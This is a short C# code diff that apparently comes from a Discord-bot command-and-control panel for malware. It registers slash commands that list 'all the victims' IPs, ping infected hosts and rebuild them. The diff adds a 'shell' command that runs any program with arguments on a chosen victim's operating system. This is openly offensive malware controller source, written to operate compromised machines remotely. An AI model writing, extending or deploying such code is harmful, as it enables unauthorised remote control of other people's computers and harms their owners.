@@ -23,12 +23,18 @@ public struct CommandBuilder
     {
         List<SlashCommandProperties> commands = new();
 
+        SlashCommandBuilder getIpCmd = new()
+        {
+            Name = "getip",
+            Description = "Get the IP of all the victims"
+        };
+
         SlashCommandBuilder pingCommand = new()
         {
             Name = "ping",
             Description = "Get the last heartbeat from the Gateway to our bot"
         };
-        pingCommand.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false, true);
+        pingCommand.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false);
 
         SlashCommandBuilder rebuildCmd = new()
         {
@@ -37,17 +43,20 @@ public struct CommandBuilder
         };
         rebuildCmd.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false);
 
-        SlashCommandBuilder getIp = new()
+        SlashCommandBuilder exOnShellCmd = new()
         {
-            Name = "getip",
-            Description = "Get the IP of all the victims"
+            Name = "shell",
+            Description = "Executes a program on the victims OS shell"
         };
+        exOnShellCmd.AddOption("victim", ApplicationCommandOptionType.String, "the Ip of the victim", true, false);
+        exOnShellCmd.AddOption("program", ApplicationCommandOptionType.String, "The PATH to the program, it can be just the program name if present on PATH", true, false);
+        exOnShellCmd.AddOption("arguments", ApplicationCommandOptionType.String, "The arguments you want the program to run with", false, false);
 
 
         commands.Add(pingCommand.Build());
         commands.Add(rebuildCmd.Build());
-        commands.Add(getIp.Build());
-
+        commands.Add(getIpCmd.Build());
+        commands.Add(exOnShellCmd.Build());
 
         return commands;
     }
